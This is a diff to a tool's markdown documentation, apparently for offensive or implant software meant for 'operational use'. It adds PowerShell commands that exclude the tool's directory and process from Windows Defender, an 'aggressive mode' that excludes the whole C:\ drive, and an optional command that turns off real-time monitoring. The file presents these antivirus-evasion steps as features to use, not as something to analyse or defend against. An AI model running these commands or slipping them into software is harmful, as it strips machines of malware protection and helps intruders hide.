@@ -27,15 +27,33 @@ This is the **recommended configuration** for operational use!
 
 ### Exclusions Added
 
+**Standard Mode** (`defender_exclusion: true`):
 ```powershell
 # 1. Path Exclusion
 Add-MpPreference -ExclusionPath 'C:\Path\To\Executable\Directory'
 
 # 2. Process Exclusion  
 Add-MpPreference -ExclusionProcess 'YourExecutable.exe'
+```
 
-# Optional (commented out by default):
-# Set-MpPreference -DisableRealtimeMonitoring $true
+**Aggressive Mode** (`defender_exclude_drive: true`):
+```powershell
+# 1. Path Exclusion (executable directory)
+Add-MpPreference -ExclusionPath 'C:\Path\To\Executable\Directory'
+
+# 2. Process Exclusion
+Add-MpPreference -ExclusionProcess 'YourExecutable.exe'
+
+# 3. ENTIRE C:\ DRIVE EXCLUSION (VERY AGGRESSIVE!)
+Add-MpPreference -ExclusionPath 'C:\'
+```
+
+?? **WARNING**: Excluding the entire C:\ drive from Windows Defender is **extremely aggressive** and **highly suspicious**. Use with caution!
+
+**Optional** (commented out by default):
+```powershell
+# Disable real-time monitoring (requires separate symbol)
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 ### Code Location
